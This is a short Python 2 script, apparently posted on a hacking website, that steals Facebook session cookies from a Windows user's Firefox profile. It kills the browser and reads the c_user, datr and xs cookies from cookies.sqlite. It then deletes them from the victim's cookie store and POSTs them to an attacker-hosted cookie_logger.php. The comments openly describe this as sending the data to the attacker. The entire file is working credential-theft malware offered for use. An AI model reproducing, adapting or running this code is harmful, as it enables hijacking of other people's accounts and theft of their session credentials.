#20th Jan,2015
#author:Rashid feroz[rashid.2008feroz@gmail.com]
#website:Hackwhiz.com
#Desc: Works only if the user has selected remember me and is login into facebook from firefox.

import os
import psutil
import sqlite3
import urllib
import urllib2

#kill firefox
PROCNAME = "firefox.exe"
 
def kill_firefox():
    for proc in psutil.process_iter():
        try:
            if proc.name() == PROCNAME:
                proc.kill()
        except:
            pass
kill_firefox()


#get cookie DB pathname
s1=os.getenv('APPDATA')
s2="\\Mozilla\\Firefox\\Profiles\\"

moz_profile_folder_name = os.listdir(s1+s2)

for name in moz_profile_folder_name:
    n=name
s=s1+s2+n+"\cookies.sqlite"


#Extract Cookie details from DB
c_user=datr=xs="None"
sqlite_file = s
conn = sqlite3.connect(sqlite_file)
c = conn.cursor()

c.execute("select count(*) from moz_cookies where baseDomain='facebook.com' and name='c_user'")

for data in c.fetchall():
    count=data[0]

if(count == 1):
    
    c.execute("select value from moz_cookies where baseDomain='facebook.com' and name='c_user'")

    for data in c.fetchall():
        c_user=data[0]

    c.execute("select value from moz_cookies where baseDomain='facebook.com' and name='datr'")

    for data in c.fetchall():
        datr=data[0]

    c.execute("select value from moz_cookies where baseDomain='facebook.com' and name='xs'")

    for data in c.fetchall():
        xs=data[0]


    #Delete facebook cookies from DB
    c.execute("delete from moz_cookies where baseDomain='facebook.com'")

conn.commit()

conn.close()

xs=str(xs)

#sending the cookie data to the attacker using POST request.
#edit the url and place your website name where you have hosted your cookie_logger.php script

url = 'http://your-website.com/cookie_logger.php'
payload = {'c_user': c_user, 'datr': datr,'xs': xs}

if (xs != "None"):
    data = urllib.urlencode(payload)
    req = urllib2.Request(url, data)
    response = urllib2.urlopen(req)



